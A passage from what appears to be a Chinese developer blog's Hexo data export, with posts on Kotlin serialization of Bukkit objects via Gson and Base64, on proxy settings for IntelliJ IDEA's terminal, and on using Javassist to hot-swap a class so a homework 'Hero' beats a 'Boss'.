operator\">:</span> JsonElement<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonDeserializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Location <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">Location</span><span class=\"token punctuation\">(</span>\n                Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getWorld</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在GsonBuilder中注册类和Adapter后构造出来的Gson实例便可以序列化&#x2F;反序列化对应的类</p>\n<p>操作算不上复杂，但也不算轻松</p>\n<p>对于只是想把实例存数据库的我来说，这些操作还是有些繁琐了</p>\n<p>所以，如果只是想把实例扔数据库里储存，使用<strong>Base64</strong>更加合适</p>\n<h2 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h2><p>base64不需要像gson那样做繁琐的操作，就可以对一个实例进行轻松的序列化&#x2F;反序列化操作</p>\n<p>并且，在现有的Java版本中，使用Base64不再需要借助任何外部库</p>\n<p><strong>唯一的缺点是，它序列出来的字符串并不像Json字符串，可以用肉眼看出来其中蕴含的信息</strong></p>\n<p>但在数据库操作中，我们并不需要让用户知道这些字符的含义，并修改它们</p>\n<p>所以，用它序列化实例再扔进SQL实在是再合适不过了</p>\n<p>上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 代码来自SacredHUD</span>\n<span class=\"token comment\">// Base64 encode</span>\n<span class=\"token keyword\">fun</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">></span><span class=\"token punctuation\">.</span><span class=\"token function\">toBase64</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> byteArrayOutputStream <span class=\"token operator\">-></span>\n        <span class=\"token function\">BukkitObjectOutputStream</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> bukkitObjectOutputStream <span class=\"token operator\">-></span>\n            bukkitObjectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getEncoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// Base64 decode</span>\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">base64ToBitmapData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> byteArrayInputStream <span class=\"token operator\">-></span>\n        <span class=\"token function\">BukkitObjectInputStream</span><span class=\"token punctuation\">(</span>byteArrayInputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> bukkitObjectInputStream <span class=\"token operator\">-></span>\n            <span class=\"token keyword\">return</span> bukkitObjectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">></span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"给Idea的Terminal设置代理","date":"2022-12-20T16:00:00.000Z","author":"寒雨","hide":false,"_content":"\n# 给Idea的Terminal设置代理\n\n虽然idea有一个代理设置，但它基本上只作用于Plugin和Plugin Market，对于gradle或者cargo这种包管理工具并没有什么用，甚至对git也没有什么用（至少在我的linux机器上，直接打开终端跑他们都是走代理的，但在idea上跑就是不走代理）。我忍这种情况已经很久了，但一直想不到解决方案。\n\n然后某天突然想到idea有个终端，难道这些任务其实是在idea的终端里面跑的吗？于是去试了下在idea的终端里跑命令，果然是不走代理的。\n\n那这问题不就解决了吗，直接找到idea终端环境变量的设置，把代理设置给配置上\n\n![image-20221221104523267](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png)\n\n设置完了重启idea之后干啥都快，cargo一眨眼就跑完了，gradle也快了很多，感情我之前是一直没用上代理啊？","source":"_posts/idea-terminal-proxy.md","raw":"---\ntitle: 给Idea的Terminal设置代理\ndate: 2022-12-21\nauthor: 寒雨\nhide: false\ncategories: 笔记\ntags:\n  - Idea\n---\n\n# 给Idea的Terminal设置代理\n\n虽然idea有一个代理设置，但它基本上只作用于Plugin和Plugin Market，对于gradle或者cargo这种包管理工具并没有什么用，甚至对git也没有什么用（至少在我的linux机器上，直接打开终端跑他们都是走代理的，但在idea上跑就是不走代理）。我忍这种情况已经很久了，但一直想不到解决方案。\n\n然后某天突然想到idea有个终端，难道这些任务其实是在idea的终端里面跑的吗？于是去试了下在idea的终端里跑命令，果然是不走代理的。\n\n那这问题不就解决了吗，直接找到idea终端环境变量的设置，把代理设置给配置上\n\n![image-20221221104523267](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png)\n\n设置完了重启idea之后干啥都快，cargo一眨眼就跑完了，gradle也快了很多，感情我之前是一直没用上代理啊？","slug":"idea-terminal-proxy","published":1,"updated":"2022-12-21T02:47:02.616Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtl001isfkl24s4a9tv","content":"<h1 id=\"给Idea的Terminal设置代理\"><a href=\"#给Idea的Terminal设置代理\" class=\"headerlink\" title=\"给Idea的Terminal设置代理\"></a>给Idea的Terminal设置代理</h1><p>虽然idea有一个代理设置，但它基本上只作用于Plugin和Plugin Market，对于gradle或者cargo这种包管理工具并没有什么用，甚至对git也没有什么用（至少在我的linux机器上，直接打开终端跑他们都是走代理的，但在idea上跑就是不走代理）。我忍这种情况已经很久了，但一直想不到解决方案。</p>\n<p>然后某天突然想到idea有个终端，难道这些任务其实是在idea的终端里面跑的吗？于是去试了下在idea的终端里跑命令，果然是不走代理的。</p>\n<p>那这问题不就解决了吗，直接找到idea终端环境变量的设置，把代理设置给配置上</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png\" alt=\"image-20221221104523267\"></p>\n<p>设置完了重启idea之后干啥都快，cargo一眨眼就跑完了，gradle也快了很多，感情我之前是一直没用上代理啊？</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"给Idea的Terminal设置代理\"><a href=\"#给Idea的Terminal设置代理\" class=\"headerlink\" title=\"给Idea的Terminal设置代理\"></a>给Idea的Terminal设置代理</h1><p>虽然idea有一个代理设置，但它基本上只作用于Plugin和Plugin Market，对于gradle或者cargo这种包管理工具并没有什么用，甚至对git也没有什么用（至少在我的linux机器上，直接打开终端跑他们都是走代理的，但在idea上跑就是不走代理）。我忍这种情况已经很久了，但一直想不到解决方案。</p>\n<p>然后某天突然想到idea有个终端，难道这些任务其实是在idea的终端里面跑的吗？于是去试了下在idea的终端里跑命令，果然是不走代理的。</p>\n<p>那这问题不就解决了吗，直接找到idea终端环境变量的设置，把代理设置给配置上</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/image-20221221104523267.png\" alt=\"image-20221221104523267\"></p>\n<p>设置完了重启idea之后干啥都快，cargo一眨眼就跑完了，gradle也快了很多，感情我之前是一直没用上代理啊？</p>\n"},{"title":"利用Javassist & Javagent实现类的热替换","date":"2021-11-18T16:00:00.000Z","author":"寒雨","hide":false,"summary":"之前Javassist使用中的疑惑终于被我解决了","_content":"\n# 利用Javassist & Javagent实现类的热替换\n\n> 几天前写红岩作业的时候，发现其中的一个level非常有意思\n>\n> 让我们定义一个Hero类，再定义一个Boss类。设定Boss的属性远大于Hero，Hero绝无战胜Boss的可能性\n>\n> 作业要求是让我们给Hero开个挂，秒杀Boss\n>\n> 出这个作业的学长大概只是想考察我们对反射的掌握程度，但我发现这个作业可以整花活（因为前段时间研究了ASM和Javassist）\n>\n> 同时我也想借这个机会解决我之前研究Javassist时碰到的疑惑\n>\n> 于是就有了这篇文章\n\n## Javassist对热替换的实现方式\n\n我之前研究了很久，到处找资料也没研究出来怎么整。不过这次我终于在网络上找到了线索，并且初步了解了它的原理。\n\n> 正常来说，只靠Java代码是没法替换一个已经加载到SystemClassLoader里的类的。（如果是别的ClassLoader加载的类，也许可以让加载这个类的ClassLoader不可达再手动调用gc来达到让这个类被作为垃圾回收的目的来删除一个类）但一串神奇的VM Options让我们拥有了从代码层面覆写一个类的能力。\n\n~~~\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000\n~~~\n\n对于这行options的作用我并不是很清楚，但它确实让Javassist的Hotswapper类有了连接VM的能力，从此热覆写一个类的字节码便从技术层面可行了。\n\n美中不足的是只有加了这行Options才能达到效果\n\n## 关键代码\n\n~~~kotlin\n/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * 三种开挂解决方案\n * 反射 javassist生成新类 热替换\n *\n * @author 寒雨\n * @since 2021/11/18 10:58\n **/\nfun main() {\n    var hero: Entity = Hero()\n    val boss = Boss()\n//    bypass(hero)\n//    hero = javassistByPass(hero)\n    hotSwap()\n    if (boss.speed > hero.speed) {\n        // Boss 先手 秒杀\n        println(\"英雄被Boss秒杀啦\")\n    } else {\n        // hero 先手\n        if (hero.damage >= boss.health) {\n            println(\"英雄开挂秒杀了Boss\")\n        } else {\n            println(\"英雄先手没能干掉Boss，被Boss反杀\")\n        }\n    }\n}\n\n/**\n * 开挂(反射)\n */\nfun bypass(hero: Entity) {\n    hero.setProperty(\"damage\", 999999)\n    hero.setProperty(\"speed\", 400)\n}\n\n// 用javassist生成新类并加载\nfun javassistByPass(hero: Entity): Entity {\n    // 获取ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // 改名，否则重复加载会抛异常\n    ctClass.name = \"hk.asgard.rain.lesson4.lv4.HeroEdited\"\n    // 从ctClass获取方法\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    return ctClass.toClass().newInstance() as Entity\n}\n\n// 热替换\n// 需要jvm选项 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 并且implementation tools.jar\nfun hotSwap() {\n    // 获取ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // 从ctClass获取方法\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    val swap = HotSwapper(8000)\n    swap.reload(\"hk.asgard.rain.lesson4.lv4.Hero\", ctClass.toBytecode())\n}\n~~~\n\n## 注意事项\n\n> 使用HotSwapper不止需要导入Javassist库，还需要导入tools.jar\n\n","source":"_posts/javassist-hotswap.md","raw":"---\ntitle: 利用Javassist & Javagent实现类的热替换\ndate: 2021-11-19\nauthor: 寒雨\nhide: false\nsummary: 之前Javassist使用中的疑惑终于被我解决了\ncategories: 笔记\ntags:\n  - Kotlin\n  - Java\n  - 外部库\n  - 字节码操作\n---\n\n# 利用Javassist & Javagent实现类的热替换\n\n> 几天前写红岩作业的时候，发现其中的一个level非常有意思\n>\n> 让我们定义一个Hero类，再定义一个Boss类。设定Boss的属性远大于Hero，Hero绝无战胜Boss的可能性\n>\n> 作业要求是让我们给Hero开个挂，秒杀Boss\n>\n> 出这个作业的学长大概只是想考察我们对反射的掌握程度，但我发现这个作业可以整花活（因为前段时间研究了ASM和Javassist）\n>\n> 同时我也想借这个机会解决我之前研究Javassist时碰到的疑惑\n>\n> 于是就有了这篇文章\n\n## Javassist对热替换的实现方式\n\n我之前研究了很久，到处找资料也没研究出来怎么整。不过这次我终于在网络上找到了线索，并且初步了解了它的原理。\n\n> 正常来说，只靠Java代码是没法替换一个已经加载到SystemClassLoader里的类的。（如果是别的ClassLoader加载的类，也许可以让加载这个类的ClassLoader不可达再手动调用gc来达到让这个类被作为垃圾回收的目的来删除一个类）但一串神奇的VM Options让我们拥有了从代码层面覆写一个类的能力。\n\n~~~\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000\n~~~\n\n对于这行options的作用我并不是很清楚，但它确实让Javassist的Hotswapper类有了连接VM的能力，从此热覆写一个类的字节码便从技术层面可行了。\n\n美中不足的是只有加了这行Options才能达到效果\n\n## 关键代码\n\n~~~kotlin\n/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * 三种开挂解决方案\n * 反射 javassist生成新类 热替换\n *\n * @author 寒雨\n * @since 2021/11/18 10:58\n **/\nfun main() {\n    var hero: Entity = Hero()\n    val boss = Boss()\n//    bypass(hero)\n//    hero = javassistByPass(hero)\n    hotSwap()\n    if (boss.speed > hero.speed) {\n        // Boss 先手 秒杀\n        println(\"英雄被Boss秒杀啦\")\n    } else {\n        // hero 先手\n        if (hero.damage >= boss.health) {\n            println(\"英雄开挂秒杀了Boss\")\n        } else {\n            println(\"英雄先手没能干掉Boss，被Boss反杀\")\n        }\n    }\n}\n\n/**\n * 开挂(反射)\n */\nfun bypass(hero: Entity) {\n    hero.setProperty(\"damage\", 999999)\n    hero.setProperty(\"speed\", 400)\n}\n\n// 用javassist生成新类并加载\nfun javassistByPass(hero: Entity): Entity {\n    // 获取ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // 改名，否则重复加载会抛异常\n    ctClass.name = \"hk.asgard.rain.lesson4.lv4.HeroEdited\"\n    // 从ctClass获取方法\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    return ctClass.toClass().newInstance() as Entity\n}\n\n// 热替换\n// 需要jvm选项 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 并且implementation tools.jar\nfun hotSwap() {\n    // 获取ctClass\n    val ctClass = ClassPool.getDefault().get(\"hk.asgard.rain.lesson4.lv4.Hero\")\n    // 从ctClass获取方法\n    val ctMethodDamage = ctClass.getDeclaredMethod(\"getDamage\")\n    val ctMethodSpeed = ctClass.getDeclaredMethod(\"getSpeed\")\n    ctMethodDamage.setBody(\"\"\"{\n        return 999999L;\n    }\"\"\")\n    ctMethodSpeed.setBody(\"\"\"{\n        return 400;\n    }\"\"\")\n    val swap = HotSwapper(8000)\n    swap.reload(\"hk.asgard.rain.lesson4.lv4.Hero\", ctClass.toBytecode())\n}\n~~~\n\n## 注意事项\n\n> 使用HotSwapper不止需要导入Javassist库，还需要导入tools.jar\n\n","slug":"javassist-hotswap","published":1,"updated":"2022-12-12T15:50:47.493Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtl001lsfkl21kf7x01","content":"<h1 id=\"利用Javassist-amp-Javagent实现类的热替换\"><a href=\"#利用Javassist-amp-Javagent实现类的热替换\" class=\"headerlink\" title=\"利用Javassist &amp; Javagent实现类的热替换\"></a>利用Javassist &amp; Javagent实现类的热替换</h1><blockquote>\n<p>几天前写红岩作业的时候，发现其中的一个level非常有意思</p>\n<p>让我们定义一个Hero类，再定义一个Boss类。设定Boss的属性远大于Hero，Hero绝无战胜Boss的可能性</p>\n<p>作业要求是让我们给Hero开个挂，秒杀Boss</p>\n<p>出这个作业的学长大概只是想考察我们对反射的掌握程度，但我发现这个作业可以整花活（因为前段时间研究了ASM和Javassist）</p>\n<p>同时我也想借这个机会解决我之前研究Javassist时碰到的疑惑</p>\n<p>于是就有了这篇文章</p>\n</blockquote>\n<h2 id=\"Javassist对热替换的实现方式\"><a href=\"#Javassist对热替换的实现方式\" class=\"headerlink\" title=\"Javassist对热替换的实现方式\"></a>Javassist对热替换的实现方式</h2><p>我之前研究了很久，到处找资料也没研究出来怎么整。不过这次我终于在网络上找到了线索，并且初步了解了它的原理。</p>\n<blockquote>\n<p>正常来说，只靠Java代码是没法替换一个已经加载到SystemClassLoader里的类的。（如果是别的ClassLoader加载的类，也许可以让加载这个类的ClassLoader不可达再手动调用gc来达到让这个类被作为垃圾回收的目的来删除一个类）但一串神奇的VM Options让我们拥有了从代码层面覆写一个类的能力。</p>\n</blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>对于这行options的作用我并不是很清楚，但它确实让Javassist的Hotswapper类有了连接VM的能力，从此热覆写一个类的字节码便从技术层面可行了。</p>\n<p>美中不足的是只有加了这行Options才能达到效果</p>\n<h2 id=\"关键代码\"><a href=\"#关键代码\" class=\"headerlink\" title=\"关键代码\"></a>关键代码</h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * hk.asgard.rain.lesson4.Lv4\n * 4thWork\n * 三种开挂解决方案\n * 反射 javassist生成新类 热替换\n *\n * @author 寒雨\n * @since 2021/11/18 10:58\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> hero<span class=\"token operator\">:</span> Entity <span class=\"token operator\">=</span> <span class=\"token function\">Hero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> boss <span class=\"token operator\">=</span> <span class=\"token function\">Boss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//    bypass(hero)</span>\n<span class=\"token comment\">//    hero = javassistByPass(hero)</span>\n    <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>boss<span class=\"token punctuation\">.</span>speed <span class=\"token operator\">&gt;</span> hero<span class=\"token punctuation\">.</span>speed<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Boss 先手 秒杀</span>\n        <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"英雄被Boss秒杀啦\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// hero 先手</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hero<span class=\"token punctuation\">.</span>damage <span class=\"token operator\">&gt;=</span> boss<span class=\"token punctuation\">.</span>health<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"英雄开挂秒杀了Boss\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"英雄先手没能干掉Boss，被Boss反杀\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">/**\n * 开挂(反射)\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">bypass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"damage\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">999999</span><span class=\"token punctuation\">)</span>\n    hero<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"speed\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 用javassist生成新类并加载</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">javassistByPass</span><span class=\"token punctuation\">(</span>hero<span class=\"token operator\">:</span> Entity<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Entity <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 获取ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 改名，否则重复加载会抛异常</span>\n    ctClass<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.HeroEdited\"</span>\n    <span class=\"token comment\">// 从ctClass获取方法</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 999999L;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 400;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">toClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Entity\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 热替换</span>\n<span class=\"token comment\">// 需要jvm选项 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 并且implementation tools.jar</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">hotSwap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 获取ctClass</span>\n    <span class=\"token keyword\">val</span> ctClass <span class=\"token operator\">=</span> ClassPool<span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hk.asgard.rain.lesson4.lv4.Hero\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 从ctClass获取方法</span>\n    <span class=\"token keyword\">val</span> ctMethodDamage <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getDamage\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> ctMethodSpeed <span class=\"token operator\">=</span> ctClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getSpeed\"</span><span class=\"token punctuation\">)</span>\n    ctMethodDamage<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 999999L;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    ctMethodSpeed<span class=\"token punctuation\">.</span><span class=\"token function\">setBody</span><span class=\"token punctuation\">(</span><span class=\"token raw-string string\">\"\"\"{\n        return 400;\n    }\"\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> swap <span class=\"token operator\">=</span> <span class=\"token function\">HotSwapper</span><span class=\"token punctuation\">(</span><span 